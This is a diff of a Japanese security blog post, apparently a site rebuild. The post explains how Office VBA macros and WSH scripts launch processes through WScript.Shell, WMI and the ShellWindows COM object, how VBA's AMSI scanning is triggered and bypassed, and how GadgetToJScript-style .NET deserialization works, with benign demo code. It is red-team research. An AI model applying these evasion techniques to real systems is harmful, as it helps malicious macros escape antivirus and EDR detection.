@@ -2,7 +2,7 @@
 <html lang="ja-JP"><head>
 	<meta charset="utf-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-	<meta name="generator" content="Hugo 0.68.3" />
+	<meta name="generator" content="Hugo 0.94.0-DEV" />
 	
 	<link rel="icon" href="/img/favicon.ico">
 	
@@ -45,7 +45,7 @@
         "position": 3,
         "item": {
           "@id": "https:\/\/www.shutingrz.com\/post\/explore-dotnet-serialize-g2js\/",
-          "name": "Gadget to j script を利用した office v b a の a m s i バイパスと原理"
+          "name": "Gadget to jscript を利用した office vba の amsi バイパスと原理"
         }
     }]
 }
@@ -80,29 +80,42 @@
 
 <meta property="og:title" content="GadgetToJScript を利用した Office VBA のAMSI バイパスと原理" />
 <meta property="og:description" content="しゅーとです。普段は IoT 機器のリバースエンジニアリングを生業としていますが、最近は流行に乗ってRed Teaming の研究もしています。 今回は WSH (vbs, js, hta) と Office マ">
-<meta property="og:image" content="https://www.shutingrz.com/post/explore-dotnet-serialize-g2js/images/cover.png" />
+
+
+
+
+<meta property="og:image" content="https://www.shutingrz.com/post/explore-dotnet-serialize-g2js/cover.png" />
+
 <meta property="og:url" content="https://www.shutingrz.com/post/explore-dotnet-serialize-g2js/" />
 <meta property="og:type" content="website" />
 <meta property="og:site_name" content="Shooting!!!" />
   <meta name="twitter:title" content="GadgetToJScript を利用した Office VBA のAMSI バイパスと原理" />
   <meta name="twitter:description" content="しゅーとです。普段は IoT 機器のリバースエンジニアリングを生業としていますが、最近は流行に乗ってRed Teaming の研究もしています。 今回は WSH (vbs, js, hta) と Office マ">
-  <meta name="twitter:image" content="https://www.shutingrz.com/post/explore-dotnet-serialize-g2js/images/cover.png" />
+
+
+
+  <meta name="twitter:image" content="https://www.shutingrz.com/post/explore-dotnet-serialize-g2js/cover.png" />
+
   <meta name="twitter:card" content="summary" /> 
-	
 
 	<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
-	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp"
-	 crossorigin="anonymous">
+	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
 	<link href="https://fonts.googleapis.com/css?family=Righteous%7CMerriweather:300,300i,400,400i,700,700i" rel="stylesheet">
-	<link href="/css/medium.css" rel="stylesheet">
-	<link href="/css/additional.css" rel="stylesheet">
+
+	
+	<link rel="stylesheet" href="https://www.shutingrz.com/css/medium.ece05c3e0cb4c172303048d902f5c72734dac11b313a671c381a53648c811f4d.css" integrity="sha256-7OBcPgy0wXIwMEjZAvXHJzTawRsxOmccOBpTZIyBH00=">
+
+	
+	<link rel="stylesheet" href="https://www.shutingrz.com/css/additional.569f3996ca35a233f4c0bd5be50243eac6dc4238f8a2cc79fc5231c99323b016.css" integrity="sha256-Vp85lso1ojP0wL1b5QJD6sbcQjj4osx5/FIxyZMjsBY=">
 
 	
 	
+	<link rel="stylesheet" href="/css/additional.css" integrity="" crossorigin="anonymous" media="screen">
 	<link rel="stylesheet" href="/css/codeblock.css" integrity="" crossorigin="anonymous" media="screen">
 	<link rel="stylesheet" href="/css/code-default.css" integrity="" crossorigin="anonymous" media="screen">
 	<link rel="stylesheet" href="/css/table.css" integrity="" crossorigin="anonymous" media="screen">
 	<link rel="stylesheet" href="/css/custom-font.css" integrity="" crossorigin="anonymous" media="screen">
+	<link rel="stylesheet" href="/css/accordion.css" integrity="" crossorigin="anonymous" media="screen">
 </head>
 <body>
 <nav class="navbar navbar-expand-lg navbar-light bg-white fixed-top mediumnavigation nav-down">
@@ -206,32 +219,21 @@
                         </div>			
                         	
                         
-                              
+                                                
                         
                         <h1 class="posttitle">GadgetToJScript を利用した Office VBA のAMSI バイパスと原理</h1> 
-                        
-                        <div class="after-post-tags">
-                            <ul class="tags">
-                            
-                            <li>
-                            <a href="/tags/pentest">pentest</a>
-                            </li>
-                            
-                            <li>
-                            <a href="/tags/bypass">bypass</a>
-                            </li>
-                            
-                            </ul>
-                        </div>
                     </div>
 
                     
-                        <img class="featured-image img-fluid" src="https://www.shutingrz.com/post/explore-dotnet-serialize-g2js/images/cover.png" alt="thumbnail for this post">
+                    
+                    
+                        <img class="featured-image img-fluid" src="https://www.shutingrz.com/post/explore-dotnet-serialize-g2js/cover.png" alt="thumbnail for this post">
                     
                     
 
                     
                     <div class="article-post">
+                        
                         <p>しゅーとです。普段は IoT 機器のリバースエンジニアリングを生業としていますが、最近は流行に乗ってRed Teaming の研究もしています。</p>
 <p>今回は WSH (vbs, js, hta) と Office マクロ事情を追ってみました。</p>
 <p>WSH (Windows Script Host) は Windows に搭載されているスクリプトエンジンで、VBScript と JScript を実行できます。 Office マクロで動作する機能・言語は様々ありますが、一般的なのは VBA (Visual Basic for Application) です。WSH、特に VBScript と VBA は構文はほとんど同じですが、実行環境は割と違っていたりします。</p>
@@ -250,54 +252,54 @@
 <h2 id="プロセス実行">プロセス実行</h2>
 <p>WSH / VBA には当然プログラムを指定して実行する機能が存在します。</p>
 <h3 id="wscriptshell-経由">WScript.Shell 経由</h3>
-<pre><code class="language-vbscript" data-lang="vbscript">CreateObject(&quot;WScript.Shell&quot;).Run &quot;calc.exe&quot;
-CreateObject(&quot;WScript.Shell&quot;).Exec &quot;notepad.exe&quot;
+<pre tabindex="0"><code class="language-vbscript" data-lang="vbscript">CreateObject(&#34;WScript.Shell&#34;).Run &#34;calc.exe&#34;
+CreateObject(&#34;WScript.Shell&#34;).Exec &#34;notepad.exe&#34;
 </code></pre><p>Shell オブジェクトを生成してプログラムを実行する一番ベーシックな方法です。JScript では ActiveXObject を利用して同様の操作が可能です。</p>
 <p>これを使って .NET プログラムを呼び出せばいいですし、PowerShell を呼び出せばそこからスクリプトを使ってファイルレスで .NET プログラムを読み込むことができます。下は .NET の MessageBox を実行する PowerShell コードです。</p>
-<p><img src="images/wshshell_powershell.png" alt="wshshell_powershell"></p>
-<p><img src="images/net_from_ps_from_wsh.png" alt="net_from_ps_from_wsh"></p>
+<p><img src="images/wshshell_powershell.png" alt="wshshell_powershell" loading="lazy" /></p>
+<p><img src="images/net_from_ps_from_wsh.png" alt="net_from_ps_from_wsh" loading="lazy" /></p>
 <p>この方法であれば、PowerShell 側で検知回避をすることで何の障害もなく .NET プログラムを読み込み可能です。</p>
 <p>Emotet ダウンローダーをはじめとした Office マクロを悪用したマルウェアは、だいたいこの手法を使ってマルウェアをダウンロードし実行しています。（コードを難読化しているくらいです）</p>
 <p>じゃあそれ使えば解決ではないか、という声が聞こえてきそうです。はい。現時点の世界のセキュリティ対策の主流ではこれでいけます。ただ PowerShell プロセスの生成を行っているので次世代の EDR 製品にはかなりの確率で検知されます。</p>
 <h3 id="wmi-経由">WMI 経由</h3>
 <p>オブジェクトを生成して利用するほかに、既にコンピュータで生成されている WMI の Win32_Process オブジェクトを呼び出してプログラムを実行する方法があります。</p>
-<div class="highlight"><pre class="chroma"><code class="language-vb" data-lang="vb"><span class="n">r</span> <span class="o">=</span> <span class="n">GetObject</span><span class="p">(</span><span class="s">&#34;winmgmts:\\.\root\cimv2:Win32_Process&#34;</span><span class="p">).</span><span class="n">Create</span><span class="p">(</span><span class="s">&#34;calc.exe&#34;</span><span class="p">,</span> <span class="n">null</span><span class="p">,</span> <span class="n">null</span><span class="p">,</span> <span class="n">intProcessID</span><span class="p">)</span>
-</code></pre></div><p>こちらは WMI を利用するため、Winmgmt サービスが実行している必要があります。なおこちらもプロセス生成が行われます。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-vb" data-lang="vb"><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">GetObject</span><span class="p">(</span><span class="s">&#34;winmgmts:\\.\root\cimv2:Win32_Process&#34;</span><span class="p">).</span><span class="n">Create</span><span class="p">(</span><span class="s">&#34;calc.exe&#34;</span><span class="p">,</span> <span class="n">null</span><span class="p">,</span> <span class="n">null</span><span class="p">,</span> <span class="n">intProcessID</span><span class="p">)</span>
+</span></span></code></pre></div><p>こちらは WMI を利用するため、Winmgmt サービスが実行している必要があります。なおこちらもプロセス生成が行われます。</p>
 <h3 id="com-オブジェクト経由">COM オブジェクト経由</h3>
 <p>Windows に多数登録されている COM オブジェクトを利用してプロセスを生成することもできます。</p>
 <p>ShellWindows オブジェクト は  Document.Application プロパティを持っていますが、このプロパティには ShellExecute メソッドという任意のプロセスを生成するメソッドを持っています。このプロパティを通して ShellExecute メソッドを呼ぶことでプログラムを実行できます。</p>
-<p><img src="images/vba_com_exec.png" alt="vba_com_exec"></p>
+<p><img src="images/vba_com_exec.png" alt="vba_com_exec" loading="lazy" /></p>
 <p><code>9BA05972-F6A8-11CF-A442-00A0C90A8F39</code> は ShellWindows オブジェクトの CLSID です。</p>
 <p>これまで紹介した WScript.Shell および WMI 経由のプロセス生成は、Office マクロで利用する際は Office プログラム(winword.exe, excel.exe)の子プロセスとして実行されます。</p>
 <p>Windows にはシステムの堅牢性を上げるために、 <strong>Exploit Protection</strong> という機能が存在します。この機能には、指定したプログラムによる子プロセス生成を防止する項目が存在します。そのため Exploit Protection にて子プロセスの生成を防止していた場合、実行がブロックされます。しかしこの方法であれば COM オブジェクト経由で実行されるため、COMオブジェクトを持つプロセスが親プロセスとなり、Exploit Protection の制限をバイパス可能です。なお ShellWindows オブジェクトを公開しているのは  explorer.exe なので、 explorer.exe が親プロセスとなります。</p>
-<p><img src="images/shellwindows_process.jpg" alt="shellwindows_process"></p>
+<p><img src="images/shellwindows_process.jpg" alt="shellwindows_process" loading="lazy" /></p>
 <blockquote>
 <p>COM オブジェクトを利用したプロセス生成は他にも様々ありますが、ここでは省略します。</p>
 </blockquote>
 <p>しかしこのコードは、Windows Defender (+クラウド提供による保護) を有効にしていると、実行時に検知され、実行できません。</p>
-<p><img src="images/detect_mal_macro.png" alt="detect_mal_macro"></p>
+<p><img src="images/detect_mal_macro.png" alt="detect_mal_macro" loading="lazy" /></p>
 <p>このようにファイル生成時には検知しなくても、実行時に検知するのは <strong>AMSI</strong> によるものです。</p>
 <h2 id="vbaとamsi">VBAとAMSI</h2>
 <p>ここまでに複数の方法でプロセスを起動する方法を書いてきました。</p>
 <p>最初の <code>CreateObject(&quot;WScript.Shell&quot;)</code>  は実際の業務でも利用されることもありアンチウイルスソフトでは検知されませんが、最後の COM オブジェクトを使ったプロセス実行手法は VBA では通常利用されることは少なく、こういったコードが含まれている xlsm ファイルはマクロ実行時にアンチウイルスソフトに検知されることがあります。</p>
 <h3 id="vba-の-amsi-スキャンエンジン">VBA の AMSI スキャンエンジン</h3>
 <p>上の COM オブジェクトの単純な呼び出しに関しては問題ありませんが、実際に CreateThread などコードインジェクションを行うようなコードは、ファイルを生成された時点でアンチウイルスソフトに検知されます。以下は metasploit で生成した、<code>net user</code> を実行させるシェルコードを含んだ VBA です。</p>
-<p><img src="images/create_thread_net_vba.png" alt="create_thread_net_vba"></p>
+<p><img src="images/create_thread_net_vba.png" alt="create_thread_net_vba" loading="lazy" /></p>
 <p>以下のようにファイル作成時、Windows Defender に検知されます。</p>
-<p><img src="images/create_thread_net_vba_detect.png" alt="create_thread_net_vba_detect"></p>
+<p><img src="images/create_thread_net_vba_detect.png" alt="create_thread_net_vba_detect" loading="lazy" /></p>
 <p>このような場合に攻撃者がとる行動は、より高度な難読化です。難読化を行うことでファイルに対する検知を回避することが可能です。</p>
-<p><img src="images/obf_create_thread_net_vba.png" alt="obf_create_thread_net_vba"></p>
+<p><img src="images/obf_create_thread_net_vba.png" alt="obf_create_thread_net_vba" loading="lazy" /></p>
 <p>しかしファイルに対する検知回避だけでは不十分です。VBA は実行時に、VBA エンジン(VBE7.DLL) に搭載されている <strong>AMSI</strong> によって API 呼び出し直前の状態でマッチングされてしまいます。下記は API Monitor で excel.exe の <code>AmsiScanString</code> 呼び出しにブレークポイントを設置し、実行時にブレークされたときの画面です。</p>
-<p><img src="images/apimonitor_break.png" alt="apimonitor_break"></p>
+<p><img src="images/apimonitor_break.png" alt="apimonitor_break" loading="lazy" /></p>
 <p>AmsiScanString() の2つ目の引数から、VirtualAlloc の呼び出し時点の引数が全て復元された状態でスキャンが動作していることがわかります。</p>
-<pre><code>&quot;kernel32.VirtualAlloc(0000000000000000,000000000000011f,0000000000001000,0000000000000040);
+<pre tabindex="0"><code>&#34;kernel32.VirtualAlloc(0000000000000000,000000000000011f,0000000000001000,0000000000000040);
 kernel32.RtlMoveMemory(,H,0000000000000001);
 kernel32.RtlMoveMemory(,00000292c4ba3498,0000000000000001);
 ...
 </code></pre><p><strong>AMSI</strong> とは Antimalware Scan Interfaceの略で、アンチウイルスソフトに依存しない、悪意のあるコンテンツをスキャンするインターフェースです。アンチウイルスソフトは AMSI を利用して<strong>メモリ</strong>上に読み込まれるコンテンツをスキャンできます。</p>
 <p>AMSI が動作するランタイムは複数あり、現在は PowerShell, WSH, VBA, .NET のランタイム用エンジンが存在します。これらのランタイムによってそれぞれエンジンの動作は異なります。</p>
 <p>VBA エンジンでは COM オブジェクトや Win32API の全ての呼び出しがふるまいログとして記録され、特定のトリガーによって AMSI プロバイダーにスキャンされるようになっています。</p>
-<p><img src="images/fig2-runtime-scanning-amsi-8.png" alt="fig2-runtime-scanning-amsi-8"></p>
+<p><img src="images/fig2-runtime-scanning-amsi-8.png" alt="fig2-runtime-scanning-amsi-8" loading="lazy" /></p>
 <p>これらの動作の詳細は <a href="https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/">Microsoft が解説</a>しています。</p>
 <h3 id="bypass-amsi">Bypass AMSI</h3>
 <p>しかし VBA エンジン (VBE7.DLL) にはいくつかの穴が存在します。COM オブジェクト、Win32API の呼び出しでログが記録されますが、その呼び出しに AMSI のトリガーとなる文字列が含まれなければ AMSI スキャンは走らないのです。</p>
@@ -305,11 +307,11 @@ kernel32.RtlMoveMemory(,00000292c4ba3498,0000000000000001);
 <ul>
 <li>
 <p>Win32API<br>
-<img src="images/amsi_trigger_win32.png" alt="amsi_trigger_win32"></p>
+<img src="images/amsi_trigger_win32.png" alt="amsi_trigger_win32" loading="lazy" /></p>
 </li>
 <li>
 <p>COM Object<br>
-<img src="images/amsi_trigger_com.png" alt="amsi_trigger_com"></p>
+<img src="images/amsi_trigger_com.png" alt="amsi_trigger_com" loading="lazy" /></p>
 </li>
 </ul>
 <p>これは VBE7.DLL をリバースエンジニアリングしてトリガーとなる CRC32 ハッシュを抽出し、文字列と突合したものです。</p>
@@ -343,66 +345,65 @@ kernel32.RtlMoveMemory(,00000292c4ba3498,0000000000000001);
 <p>この手法は COM オブジェクトを操作できるあらゆるプログラミング言語で適用できます。氏のブログでは C# で PoC が書かれていましたが、それを WSH / VBA でもかけるという話です。</p>
 <h2 id="デシリアライズの原理">デシリアライズの原理</h2>
 <p>D2JS、G2JS の説明の前に、本記事でも C# で実際に &ldquo;Hello, World&rdquo; という値を持つ String オブジェクトをシリアライズ・デシリアライズできることを確認してみましょう。</p>
-<div class="highlight"><pre class="chroma"><code class="language-csharp" data-lang="csharp"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
-<span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>
-<span class="k">using</span> <span class="nn">System.Runtime.Serialization</span><span class="p">;</span>
-<span class="k">using</span> <span class="nn">System.Runtime.Serialization.Formatters.Binary</span><span class="p">;</span>
-
-<span class="cm">/**
-</span><span class="cm">    Ref:
-</span><span class="cm">    https://googleprojectzero.blogspot.com/2017/04/exploiting-net-managed-dcom.html
-</span><span class="cm">    https://github.com/med0x2e/GadgetToJScript
-</span><span class="cm">    https://silentbreaksecurity.com/re-animating-activitysurrogateselector/
-</span><span class="cm">**/</span>
-
-<span class="c1">// Definitely non-serializable class.
-</span><span class="c1"></span><span class="k">class</span> <span class="nc">NonSerializable</span> <span class="p">{</span>
-  <span class="k">private</span> <span class="kt">string</span> <span class="n">_text</span><span class="p">;</span>
-
-  <span class="k">public</span> <span class="n">NonSerializable</span><span class="p">(</span><span class="kt">string</span> <span class="n">text</span><span class="p">)</span> <span class="p">{</span>
-    <span class="n">_text</span> <span class="p">=</span> <span class="n">text</span><span class="p">;</span>
-  <span class="p">}</span>
-
-  <span class="k">public</span> <span class="k">override</span> <span class="kt">string</span> <span class="n">ToString</span><span class="p">()</span> <span class="p">{</span>
-    <span class="k">return</span> <span class="n">_text</span><span class="p">;</span>
-  <span class="p">}</span>
-<span class="p">}</span>
-
-<span class="c1">// Custom serialization surrogate
-</span><span class="c1"></span><span class="k">class</span> <span class="nc">_SurrogateSelector</span> <span class="p">:</span> <span class="n">SurrogateSelector</span>
-<span class="p">{</span>
-    <span class="k">public</span> <span class="k">override</span> <span class="n">ISerializationSurrogate</span> <span class="n">GetSurrogate</span><span class="p">(</span><span class="n">Type</span> <span class="n">type</span><span class="p">,</span> <span class="n">StreamingContext</span> <span class="n">context</span><span class="p">,</span> <span class="k">out</span> <span class="n">ISurrogateSelector</span> <span class="n">selector</span><span class="p">)</span>
-    <span class="p">{</span>
-        <span class="n">selector</span> <span class="p">=</span> <span class="k">this</span><span class="p">;</span>
-        <span class="k">if</span> <span class="p">(!</span><span class="n">type</span><span class="p">.</span><span class="n">IsSerializable</span><span class="p">)</span>
-        <span class="p">{</span>
-            <span class="n">Type</span> <span class="n">t</span> <span class="p">=</span> <span class="n">Type</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="s">&#34;System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate, System.Workflow.ComponentModel, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&#34;</span><span class="p">);</span>
-            <span class="k">return</span> <span class="p">(</span><span class="n">ISerializationSurrogate</span><span class="p">)</span><span class="n">Activator</span><span class="p">.</span><span class="n">CreateInstance</span><span class="p">(</span><span class="n">t</span><span class="p">);</span>
-        <span class="p">}</span>
-        <span class="k">return</span> <span class="k">base</span><span class="p">.</span><span class="n">GetSurrogate</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">context</span><span class="p">,</span> <span class="k">out</span> <span class="n">selector</span><span class="p">);</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-
-<span class="k">class</span> <span class="nc">Program</span>
-<span class="p">{</span>
-    <span class="k">static</span> <span class="k">void</span> <span class="n">TestObjectSerializedRef</span><span class="p">()</span> <span class="p">{</span>
-        <span class="n">BinaryFormatter</span> <span class="n">fmt</span> <span class="p">=</span> <span class="k">new</span> <span class="n">BinaryFormatter</span><span class="p">();</span>
-        <span class="n">MemoryStream</span> <span class="n">stm</span> <span class="p">=</span> <span class="k">new</span> <span class="n">MemoryStream</span><span class="p">();</span>
-        <span class="n">fmt</span><span class="p">.</span><span class="n">SurrogateSelector</span> <span class="p">=</span> <span class="k">new</span> <span class="n">_SurrogateSelector</span><span class="p">();</span>
-        <span class="n">fmt</span><span class="p">.</span><span class="n">Serialize</span><span class="p">(</span><span class="n">stm</span><span class="p">,</span> <span class="k">new</span> <span class="n">NonSerializable</span><span class="p">(</span><span class="s">&#34;Hello World!&#34;</span><span class="p">));</span>
-        <span class="n">stm</span><span class="p">.</span><span class="n">Position</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
-
-        <span class="c1">// Should print Hello World!.
-</span><span class="c1"></span>        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">fmt</span><span class="p">.</span><span class="n">Deserialize</span><span class="p">(</span><span class="n">stm</span><span class="p">));</span>
-    <span class="p">}</span>
-    
-    <span class="k">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">()</span>
-    <span class="p">{</span>
-        <span class="n">TestObjectSerializedRef</span><span class="p">();</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-
-</code></pre></div><p>このコードの説明をします。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Runtime.Serialization</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.Runtime.Serialization.Formatters.Binary</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">    Ref:
+</span></span></span><span class="line"><span class="cl"><span class="cm">    https://googleprojectzero.blogspot.com/2017/04/exploiting-net-managed-dcom.html
+</span></span></span><span class="line"><span class="cl"><span class="cm">    https://github.com/med0x2e/GadgetToJScript
+</span></span></span><span class="line"><span class="cl"><span class="cm">    https://silentbreaksecurity.com/re-animating-activitysurrogateselector/
+</span></span></span><span class="line"><span class="cl"><span class="cm">**/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Definitely non-serializable class.</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">NonSerializable</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">private</span> <span class="kt">string</span> <span class="m">_</span><span class="n">text</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">public</span> <span class="n">NonSerializable</span><span class="p">(</span><span class="kt">string</span> <span class="n">text</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="m">_</span><span class="n">text</span> <span class="p">=</span> <span class="n">text</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">public</span> <span class="k">override</span> <span class="kt">string</span> <span class="n">ToString</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="m">_</span><span class="n">text</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Custom serialization surrogate</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">_SurrogateSelector</span> <span class="p">:</span> <span class="n">SurrogateSelector</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">override</span> <span class="n">ISerializationSurrogate</span> <span class="n">GetSurrogate</span><span class="p">(</span><span class="n">Type</span> <span class="n">type</span><span class="p">,</span> <span class="n">StreamingContext</span> <span class="n">context</span><span class="p">,</span> <span class="k">out</span> <span class="n">ISurrogateSelector</span> <span class="n">selector</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">selector</span> <span class="p">=</span> <span class="k">this</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(!</span><span class="n">type</span><span class="p">.</span><span class="n">IsSerializable</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Type</span> <span class="n">t</span> <span class="p">=</span> <span class="n">Type</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="s">&#34;System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate, System.Workflow.ComponentModel, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">(</span><span class="n">ISerializationSurrogate</span><span class="p">)</span><span class="n">Activator</span><span class="p">.</span><span class="n">CreateInstance</span><span class="p">(</span><span class="n">t</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">base</span><span class="p">.</span><span class="n">GetSurrogate</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">context</span><span class="p">,</span> <span class="k">out</span> <span class="n">selector</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Program</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">static</span> <span class="k">void</span> <span class="n">TestObjectSerializedRef</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">BinaryFormatter</span> <span class="n">fmt</span> <span class="p">=</span> <span class="k">new</span> <span class="n">BinaryFormatter</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">MemoryStream</span> <span class="n">stm</span> <span class="p">=</span> <span class="k">new</span> <span class="n">MemoryStream</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fmt</span><span class="p">.</span><span class="n">SurrogateSelector</span> <span class="p">=</span> <span class="k">new</span> <span class="m">_</span><span class="n">SurrogateSelector</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">fmt</span><span class="p">.</span><span class="n">Serialize</span><span class="p">(</span><span class="n">stm</span><span class="p">,</span> <span class="k">new</span> <span class="n">NonSerializable</span><span class="p">(</span><span class="s">&#34;Hello World!&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">stm</span><span class="p">.</span><span class="n">Position</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Should print Hello World!.</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Console</span><span class="p">.</span><span class="n">WriteLine</span><span class="p">(</span><span class="n">fmt</span><span class="p">.</span><span class="n">Deserialize</span><span class="p">(</span><span class="n">stm</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">static</span> <span class="k">void</span> <span class="n">Main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">TestObjectSerializedRef</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>このコードの説明をします。</p>
 <p>自作クラス NonSerializable はコンストラクタで String オブジェクトを受け取るようにしています。また ToString をオーバーライドし String オブジェクトを返すようにします。ToString は、 <a href="https://docs.microsoft.com/ja-jp/dotnet/csharp/programming-guide/classes-and-structs/how-to-override-the-tostring-method">C# では全てのクラスが暗黙的に Object クラスを継承し、文字列表現をリターンできるようにしている</a> ため、Console.WriteLine() が呼ばれると、このクラスはコンストラクタで渡された &ldquo;Hello World!&ldquo;を返します。</p>
 <blockquote>
 <p>ただしこのクラスは Serializable アトリビュートを持っていないので、本来であればシリアライズできません。</p>
@@ -410,53 +411,53 @@ kernel32.RtlMoveMemory(,00000292c4ba3498,0000000000000001);
 <p>そんなクラスを SurrogateSelector.Serialize でシリアライズします。</p>
 <p>Serialize は Serializable アトリビュートが付いたクラスしかシリアライズしませんが、SurrogateSelector クラスの GetSurrogate メソッドをオーバーライドし、シリアライズできないクラスでもサロゲートクラスに変換させるようにすることで<strong>任意のクラスをシリアライズできる</strong>ようにしています。</p>
 <p>このコードをcsc.exeでコンパイルし、実行します。</p>
-<p><img src="images/deserialize_exception.png" alt="deserialize_exception"></p>
+<p><img src="images/deserialize_exception.png" alt="deserialize_exception" loading="lazy" /></p>
 <p>例外が発生しました。発生箇所は ObjectSurrogate.GetObjectDataです。</p>
 <p><strong>これは最近の Windows10 / WindowsServer で予期された動作です。</strong></p>
 <p>Forshaw 氏のブログが公開された後、Microsoft は ObjectSurrogate の任意にデシリアライズできる実装について好ましく思っておらず、.NET 4.8 のアップデートでデシリアライズ時の型チェックを行うようにしました。</p>
-<div class="highlight"><pre class="chroma"><code class="language-csharp" data-lang="csharp"><span class="k">private</span> <span class="k">sealed</span> <span class="k">class</span> <span class="nc">ObjectSurrogate</span> <span class="p">:</span> <span class="n">ISerializationSurrogate</span>
-<span class="p">{</span>
-	<span class="k">public</span> <span class="k">void</span> <span class="n">GetObjectData</span><span class="p">(</span><span class="kt">object</span> <span class="n">obj</span><span class="p">,</span> <span class="n">SerializationInfo</span> <span class="n">info</span><span class="p">,</span> <span class="n">StreamingContext</span> <span class="n">context</span><span class="p">)</span>
-	<span class="p">{</span>
-		<span class="k">if</span> <span class="p">(!</span><span class="n">AppSettings</span><span class="p">.</span><span class="n">DisableActivitySurrogateSelectorTypeCheck</span> <span class="p">&amp;&amp;</span>
-			<span class="p">!(</span><span class="n">obj</span> <span class="k">is</span> <span class="n">ActivityBind</span><span class="p">)</span> <span class="p">&amp;&amp;</span> <span class="p">!(</span><span class="n">obj</span> <span class="k">is</span> <span class="n">DependencyObject</span><span class="p">))</span>
